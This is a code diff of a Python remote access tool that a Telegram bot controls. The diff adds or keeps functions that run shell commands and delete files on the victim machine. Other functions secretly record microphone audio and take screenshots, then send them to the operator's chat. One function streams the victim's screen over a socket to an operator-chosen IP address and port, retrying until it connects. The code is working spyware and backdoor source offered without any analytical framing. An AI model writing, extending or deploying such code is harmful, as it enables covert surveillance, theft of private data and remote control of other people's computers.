@@ -1,11 +1,19 @@
 import subprocess
 import pyautogui
-from telebot import TeleBot
-from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
 import pyaudio
+import socket
+import pickle
+import struct
+import random
+import time
 import wave
 import os
-import pickle
+
+import numpy as np
+
+from telebot import TeleBot
+from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
+from PIL import Image
 
 # Variables
 API_TOKEN = "<token>"
@@ -84,65 +92,6 @@ def checkID(ms):
 
 
 # Fn(2)
-def dump_audio():
-    with open("dump_record_audio.dat", "rb") as dump_in:
-        unpickler = pickle.Unpickler(dump_in)
-        frame = unpickler.load()
-
-        p = pyaudio.PyAudio()
-        stream = p.open(format=FORMAT,
-                        channels=channels,
-                        rate=sample_rate,
-                        input=True,
-                        output=True,
-                        frames_per_buffer=chunk)
-        
-        wf = wave.open(filename_audio, "wb")
-        wf.setnchannels(channels)
-        wf.setsampwidth(p.get_sample_size(FORMAT))
-        wf.setframerate(sample_rate)
-        wf.writeframes(b"".join(frame))
-        wf.close()
-        
-        bot.send_message(ADMIN, "Unpacked!")
-        
-        with open(filename_audio, "rb") as audio:
-            bot.send_audio(ADMIN, audio)
-        
-        os.remove(filename_audio)
-
-def screen_broadcast(ms):
-    bot.send_message(ADMIN, "Enter...")
-    
-    @bot.message_handler(content_types=["text"])
-    def screen_broadcast_next(ms):
-        try:
-            list_data = ms.text.split()
-            PORT = int(list_data[0])
-            IP = list_data[1]
-            
-            import numpy as np
-            import socket
-            import pickle
-            import struct
-            import pyautogui
-            from PIL import Image
-
-            clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            clientsocket.connect((IP, PORT))
-
-            while True:
-                image = pyautogui.screenshot()
-                image = image.resize((1100, 650))
-                image = np.array(image)
-                img = Image.frombytes('RGB', (1100, 650), image)
-                data = pickle.dumps(np.array(img))
-                clientsocket.sendall(struct.pack("L", len(data)) + data)
-        except Exception as e:
-            bot.send_message(ADMIN, f"Error:\n{e}")
-    
-    bot.register_next_step_handler(ms, screen_broadcast_next)
-
 def cd():
     output = os.getcwd()
     bot.send_message(ADMIN, output, reply_markup=markup)
@@ -183,25 +132,25 @@ def dir():
     except Exception as e:
         bot.send_message(ADMIN, f"Error:\n{e}")
 
-def del_path(ms):
+def del_file(ms):
     markup_del = ReplyKeyboardMarkup()
     create_markup(markup_del)
     bot.send_message(ADMIN, "Enter path...", reply_markup=markup_del)
 
     @bot.message_handler(content_types=["text"])
-    def del_path_next(ms):
+    def del_file_next(ms):
         if ms.text != "None":
             try:
                 path_file = ms.text
                 os.remove(path_file)
-                bot.send_message(ADMIN, "File removed!")
+                bot.send_message(ADMIN, "File removed ✅")
             except Exception as e:
                 bot.send_message(ADMIN, f"Error:\n{e}")
-                
+
         bot.send_message(ADMIN, "ㅤ", reply_markup=ReplyKeyboardRemove())
         bot.send_message(ADMIN, "ㅤ", reply_markup=markup)
 
-    bot.register_next_step_handler(ms, del_path_next)
+    bot.register_next_step_handler(ms, del_file_next)
 
 def type(ms):
     markup_type = ReplyKeyboardMarkup()
@@ -242,40 +191,8 @@ def get_file(ms):
 
         bot.send_message(ADMIN, "ㅤ", reply_markup=ReplyKeyboardRemove())
         bot.send_message(ADMIN, "ㅤ", reply_markup=markup)
-                
+
     bot.register_next_step_handler(ms, get_file_next)
-
-def recording_audio(ms):
-        bot.send_message(ADMIN, "Enter time, quantity iteration...")
-        
-        @bot.message_handler(content_types=["text"])
-        def recording_audio_next(ms):
-            try:
-                list_data = ms.text.split(" ")
-                time = int(list_data[0])
-                quantity = int(list_data[1])
-                bot.send_message(ADMIN, "Recording...")
-                
-                for i in range(quantity):
-                    recordAUDIO(time)
-                    with open(filename_audio, 'rb') as audio:
-                        bot.send_audio(ADMIN, audio)
-                
-                os.remove(filename_audio)
-                bot.send_message(ADMIN, "Finished recording.")
-            except Exception as e:
-                bot.send_message(ADMIN, f"Error:\n{e}")
-
-        bot.register_next_step_handler(ms, recording_audio_next)
-
-def screenshot():
-    myScreenshot = pyautogui.screenshot()
-    myScreenshot.save("screenshot.jpg")
-
-    with open(filename_screenshot, "rb") as photo:
-        bot.send_photo(ADMIN, photo, reply_markup=markup)
-    
-    os.remove(filename_screenshot)
 
 def exec_cmd(ms):
     bot.send_message(ADMIN, "Enter command...")
@@ -294,6 +211,101 @@ def exec_cmd(ms):
             bot.send_message(ADMIN, f"Error:\n{e}")
 
     bot.register_next_step_handler(ms, exec_cmd_next)
+
+def record_audio(ms):
+        bot.send_message(ADMIN, "Enter time, quantity iteration...")
+        
+        @bot.message_handler(content_types=["text"])
+        def record_audio_next(ms):
+            try:
+                list_data = ms.text.split(" ")
+                time = int(list_data[0])
+                quantity = int(list_data[1])
+                bot.send_message(ADMIN, "Recording 🎲")
+                
+                for i in range(quantity):
+                    recordAUDIO(time)
+                    with open(filename_audio, 'rb') as audio:
+                        bot.send_audio(ADMIN, audio)
+                
+                os.remove(filename_audio)
+                bot.send_message(ADMIN, "Finished recording ✅")
+            except Exception as e:
+                bot.send_message(ADMIN, f"Error:\n{e}")
+
+        bot.register_next_step_handler(ms, record_audio_next)
+
+def dump_audio():
+    with open("dump_record_audio.dat", "rb") as dump_in:
+        unpickler = pickle.Unpickler(dump_in)
+        frame = unpickler.load()
+
+        p = pyaudio.PyAudio()
+        stream = p.open(format=FORMAT,
+                        channels=channels,
+                        rate=sample_rate,
+                        input=True,
+                        output=True,
+                        frames_per_buffer=chunk)
+        
+        wf = wave.open(filename_audio, "wb")
+        wf.setnchannels(channels)
+        wf.setsampwidth(p.get_sample_size(FORMAT))
+        wf.setframerate(sample_rate)
+        wf.writeframes(b"".join(frame))
+        wf.close()
+        
+        bot.send_message(ADMIN, "Unpacked ✅")
+        
+        with open(filename_audio, "rb") as audio:
+            bot.send_audio(ADMIN, audio)
+        
+        os.remove(filename_audio)
+
+def screenshot():
+    myScreenshot = pyautogui.screenshot()
+    myScreenshot.save("screenshot.jpg")
+
+    with open(filename_screenshot, "rb") as photo:
+        bot.send_photo(ADMIN, photo, reply_markup=markup)
+    
+    os.remove(filename_screenshot)
+
+def screen_broadcast(ms):
+    bot.send_message(ADMIN, "Enter port, ip...")
+    
+    @bot.message_handler(content_types=["text"])
+    def screen_broadcast_next(ms):
+        try:
+            list_data = ms.text.split()
+            PORT = int(list_data[0])
+            IP = list_data[1]
+
+            clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            
+            while True:
+                try:
+                    bot.send_message(ADMIN, "Connection attempt 🎲")
+                    clientsocket.connect((IP, PORT))
+                    break
+                except Exception as e:
+                    bot.send_message(ADMIN, "Сonnection error ❌")
+                    time.sleep(10)
+
+            bot.send_message(ADMIN, "Successful connection ✅")
+            while True:
+                image = pyautogui.screenshot()
+                image = image.resize((1024, 576))
+                image = np.array(image)
+                img = Image.frombytes('RGB', (1024, 576), image)
+                data = pickle.dumps(np.array(img))
+                clientsocket.sendall(struct.pack("L", len(data)) + data)
+                
+        except Exception as e:
+            bot.send_message(ADMIN, f"Error:\n{e}")
+    
+    bot.register_next_step_handler(ms, screen_broadcast_next)
+
 
 # Start
 @bot.message_handler(commands=["_start", "_help"])
@@ -315,7 +327,7 @@ def CheckCommand(ms):
             dir()
 
         elif ms.text == "del":
-            del_path(ms)
+            del_file(ms)
         
         elif ms.text == "type":
             type(ms)
@@ -327,7 +339,7 @@ def CheckCommand(ms):
             exec_cmd(ms)
 
         elif ms.text == "record_audio":
-            recording_audio(ms)
+            record_audio(ms)
 
         elif ms.text == "dump_audio":
             dump_audio()
